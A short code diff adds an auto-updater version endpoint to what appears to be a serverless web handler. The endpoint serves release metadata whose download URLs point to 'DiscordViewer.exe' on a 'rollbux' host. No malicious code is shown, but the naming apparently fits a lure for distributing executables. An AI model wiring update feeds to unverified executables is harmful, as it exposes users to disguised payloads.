@@ -2143,6 +2143,24 @@ export default async function handler(req, res) {
   }
 
 
+  // Application version check endpoint for auto-updater
+  if (pathname === '/api/version' && req.method === 'GET') {
+    sendJson(res, 200, {
+      tag_name: 'v1.1.4',
+      name: 'v1.1.4',
+      version: '1.1.4',
+      download_url: 'https://rollbux.vercel.app/DiscordViewer.exe',
+      browser_download_url: 'https://rollbux.vercel.app/DiscordViewer.exe',
+      assets: [
+        {
+          name: 'DiscordViewer.exe',
+          browser_download_url: 'https://rollbux.vercel.app/DiscordViewer.exe'
+        }
+      ]
+    });
+    return;
+  }
+
   // Direct DiscordViewer Windows executable download
   if ((pathname === '/download/file' || pathname === '/download/DiscordViewer.exe') && req.method === 'GET') {
     res.writeHead(302, {
